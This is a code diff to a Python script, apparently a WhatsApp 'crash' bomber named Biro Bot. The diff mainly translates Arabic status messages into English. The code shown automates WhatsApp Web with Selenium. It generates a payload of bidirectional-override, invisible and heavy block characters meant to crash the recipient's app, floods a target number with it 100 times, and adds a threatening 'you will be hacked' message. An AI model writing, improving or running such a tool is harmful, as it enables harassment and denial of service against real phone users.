@@ -34,7 +34,7 @@ def show_banner():
     ╚═════╝ ╚═╝╚═╝  ╚═╝ ╚═════╝     ╚═════╝  ╚═════╝    ╚═╝   
                                 {Colors.CYAN}--- VERSION 7.0 ---{Colors.RED}
                                 
-    {Colors.YELLOW}>> Status: Multi-Platform (Kali / Termux / Win)
+    {Colors.YELLOW}>> Status: Multi-Platform (Linux / Termux / Win)
     >> Engine: Selenium Ultra-Crash Protocol
     >> Dev: Marwan Elbadry{Colors.END}
     """
@@ -42,7 +42,7 @@ def show_banner():
 
 def main():
     show_banner()
-    print(f"{Colors.CYAN}🚀 تجهيز المتصفح ونظام التشفير...{Colors.END}")
+    print(f"{Colors.CYAN}✔ Loading...{Colors.END}")
     options = webdriver.ChromeOptions()
     current_dir = os.path.dirname(os.path.abspath(__file__))
     session_path = os.path.join(current_dir, "whatsapp_session")
@@ -52,8 +52,8 @@ def main():
     driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
 
     driver.get("https://web.whatsapp.com")
-    print("📱 لو طلب منك، اعمل Scan للـ QR Code من موبايلك..")
-    input("✅ بعد ما المحادثات تظهر، اضغط Enter هنا عشان نبدأ...")
+    print("⌘ scan QR code..")
+    input("✔ Press Enter to start...")
     def generate_crash_payload():
         bidi_chars = ["\u202e", "\u202d", "\u202a", "\u202c", "\u200f"]
         heavy_chars = ["▓", "▒", "░", "█", "█","▌","▌█","▧","█", "☣️", "⚠️", "🚫"]
@@ -73,7 +73,7 @@ def main():
         return f"{bidi_loop}\n{heavy_symbols}\n{invisible_mass}\n{bidi_loop}"
     def send_scary_msg(phone_number, scary_text, count):
             start_time = time.time() # the time counter
-            print(f"🚀 جاري بدء الهجوم المنظم على {phone_number}...")
+            print(f"✔ The organized attack is beginning on {phone_number}...")
             url = f"https://web.whatsapp.com/send?phone={phone_number}"
             driver.get(url) 
 
@@ -87,7 +87,7 @@ def main():
 
                 pyperclip.copy(scary_text)
 
-                print(f"🔥 بدأ إرسال الرسالة المرعبة {count} مرة...")
+                print(f"✔ sent {count} msg...")
 
                 for i in range(1, count + 1):
                     # dynamic_payload
@@ -107,22 +107,22 @@ def main():
 
                     # لمسة "المهندس": Burst Mode
                     if i % 20 == 0:
-                        print(f"📦 تم إرسال دفعة من 20 قنبلة.. استراحة قصيرة للـ Buffer")
-                        time.sleep(0.1) # استراحة عشان حسابك م يتحظرش
+                        print(f"Done (a number of msgs is 20)")
+                        time.sleep(0.1) #sleep
                     
-                    # طباعة الحالة بشكل شيك
+                    # Done
                     print(f"[{i}/{count}] - القنبلة طارت! 💣")
                 end_time = time.time()
                 duration = round(end_time - start_time, 2)
-                print(f"\n✅ المهمة اكتملت في {duration} ثانية.")
+                print(f"\n✔ mission complete during {duration} s.")
             except Exception as e:
-                print(f"❌ حصلت مشكلة: {e}")
+                print(f"× Ooops Error!: {e}")
 
 
     my_msg = """
     ☞ shatafa Contact will be hacked
     You will be hacked By Biro Bot 7 
-    "أفجر تهكير في المجال"
+    "أجمد تهكير في المجال"
     "★彡✦ السراب البعيد ✦彡★"
     "▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓هَهَهَهَهَهَ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒"
     "ﭼهِازﮚﮚ بيتقْيُﮰ▒▒▒▒▒▌▌▌▌"
@@ -154,8 +154,8 @@ def main():
 
     send_scary_msg(target_number, bomb_payload, 100)
 
-    print("\n🎯 المهمة تمت بنجاح يا هندسة.")
-    input("اضغط Enter عشان تقفل المتصفح...")
+    print("\n ✔ mission done successfully")
+    input("Press enter to end..")
     driver.quit()
 
 if __name__ == "__main__":
